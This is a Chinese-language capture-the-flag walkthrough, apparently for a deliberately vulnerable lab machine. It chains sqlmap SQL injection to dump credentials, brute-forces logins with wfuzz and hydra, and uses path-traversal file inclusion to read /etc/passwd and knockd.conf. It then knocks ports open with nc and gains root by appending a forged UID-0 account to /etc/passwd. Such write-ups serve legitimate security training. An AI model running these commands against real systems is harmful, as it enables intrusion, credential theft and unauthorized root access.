## 漏洞发现

查看网页源码，没有什么有用的信息

![](../Images/c122745fe2dc127f379d517d9c64ca45.png)

  

  

访问HTTP服务，发现在search标签处存在SQL注入漏洞

![](../Images/00e5e5ea51c70c9196b55fb114e59524.png)

  

![](../Images/9180de54142fd827ea75f3944bf98dc6.png)

  

  

使用burpsuite抓包，将请求包保存到test.txt文档中，使用sqlmap扫描

```
sqlmap -r test.txt --dbs
```

![](../Images/49edcae8fd29ced08fbd677b6f45efc9.png)

  

  

暴表

```
sqlmap -r test.txt -D users --tables
```

![](../Images/6fb12645b1b0e6a9f4cffb83d043c194.png)

  

  

暴字段

```
sqlmap -r test.txt -D users -T UserDetails --columns
```

![](../Images/b14628f249e2b0a67c88315d4010b873.png)

  

  

拖库

```
sqlmap -r test.txt -D users -T UserDetails -C username,password --dump
```

![](../Images/e1bd1f224eca606fc04ad8552a47b1a2.png)

  

  

将得到的账户和密码分别保存为账号字典和密码字典使用burpsuite进行爆破（手动登录太麻烦了），并没有找到成功登录的账号

![](../Images/08309695a27b4c19a6dd85b53ad809f0.png)

  

  

尝试使用wfuzz进行爆破，依然是没有成功匹配的账户  

```
wfuzz -z file,username.txt -z file,password.txt -d "username=FUZZ&password=FUZ2Z" http://192.168.1.17/manage.php
```

![](../Images/bcbab59e313fda8076d1700206c0d0d9.png)

  

  

使用sqlmap爆破另外一个库

```



sqlmap -r test.txt --dbs
```

![](../Images/8265ed0db22fa5ecdf9bdd7ccec396ae.png)

  

  

md5解密得到密码transorbital1

![](../Images/7f23ef95bff80983cd16e1646b0a826a.png)

  

  

尝试登录后台，成功，登录后台发现并没有什么东西不过在页面提示了`File does not exist`联想到上面说的可能存在文件包含漏洞

![](../Images/a23076f5b06a6557294700518ce9ba05.png)

  

  

可能存在文件包含漏洞，但是我们不知道包含参数是什么，使用wfuzz测试探测参数

```
wfuzz -b 'PHPSESSID=5ooo4v00ecl2d0lft26rlh12k5' -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.1.17/manage.php?FUZZ=../../../../../../../../etc/passwd
```

![](../Images/7d82def5a3e411db23cd5b79f76e34f3.png)

  

  

添加过滤条件，成功得到参数`file`

```
wfuzz --hw 87 -b 'PHPSESSID=5ooo4v00ecl2d0lft26rlh12k5' -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.1.17/manage.php?FUZZ=../../../../../../../../etc/passwd
```

![](../Images/59837942f1f2bb5c622dcd8dd96012a3.png)

  

  

访问/etc/passwd文件，发现一些账户和我们前面爆破第一个数据库里面的账户相同

![](../Images/039526bd2613ec21b4a75b7a9fb4f5b4.png)

  

  

使用前面第一个数据库里面的账户和密码来爆破SSH服务，链接失败

```
hydra -L username.txt -P password.txt 192.168.1.17 ssh
```

![](../Images/9c13d8b88a33ba60e7a4a109825d7049.png)

  

  

再次扫描22号端口

```
nmap -sV -A 192.168.1.17 -p 22
```

![](../Images/93541e5549644c0ec1516ef7b5f50024.png)

  

可能存在的问题

*   不允许字典中的用户远程链接
    
*   22端口可能不是ssh服务
    
*   启用了端口敲门服务
    

互联网搜索端口敲门服务发现若是存在端口敲门服务则在etc目录下会存在knockd.conf文件

![](../Images/bf23c2082b1c540c390649eb9c87c3a1.png)

  

  

利用文件包含漏洞查看是否存在该文件

![](../Images/c69df45bff7d674917da9e57fa14eafc.png)

  

  

存在该文件，而且我们还得到了端口开门序号7469、8475、9842

敲门开启SSH服务

![](../Images/7fab71b207534b115bd1616db0a81198.png)

```



nmap -p 7469 192.168.1.17
```

失败  

![](../Images/909e17590f154287f60103cafa852ffd.png)

  

  

使用natcat命令敲门，成功

```
for x in 7469 8475 9842; do nc 192.168.1.17 $x;done
```

![](../Images/c69cb7f8b6c4b5eb2850742e2829015b.png)

  

  

再次爆破，得到了三个账户

```
hydra -L username.txt -P password.txt 192.168.1.17 ssh
```

![](../Images/a9459c9c1f09d42635310e8cec95a1d9.png)

  

  

依次登录查找最大权限的账户，在janitor用户里面发现新的密码

![](../Images/5d0da0b34b7d12630a2b697b07765cac.png)

  

  

将密码提取出来结合前面的username.txt再次使用hydra进行爆破

```

hydra -L username.txt -P password2.txt 192.168.1.17 ssh
```

得到一个新用户fredf

![](../Images/1540699d0c283d0afceb773e0303ea56.png)

  

使用fredf账户登录，输入`sudo -l`显示我们可以使用`root`身份执行`/opt/devstuff/dist/test/test`并且不需要密码

![](../Images/8fbab73f305dd28d265184caaf710d40.png)

  

  

进入/opt/devstuff/dist/test/执行一下这个test文件

![](../Images/8442ea2477d316274f86a9a3e5cd63b6.png)

  

显示`Usage: python test.py read append`，就是说这个脚本可以以root权限将任意内容写入任意文件。那么我们可以写入一个具有root权限的用户到/etc/passwd文件中。

  

使用openssl生成我们自己的password

```
openssl passwd -1 -salt XMTX 123456
```

![](../Images/2a921444b2dba82d2539c22565ef5c66.png)

  

  

将我们的内容写入tmp目录下的文件，内容为

```

echo 'XMTX:$1$XMTX$c8g3nQF1CtFDu//blOniM0:0:0::/root:/bin/bash' > /tmp/password
```

![](../Images/5631e80c6aae4c97dcce602b87f2346d.png)

  

  

利用test脚本将password中的内容追加到/etc/password中并切换到XMTX用户

```
sudo ./test /tmp/password /etc/passwd
```

![](../Images/d7f38608ba447ddcd66340b62fbb2d7e.png)

  

成功得到root权限
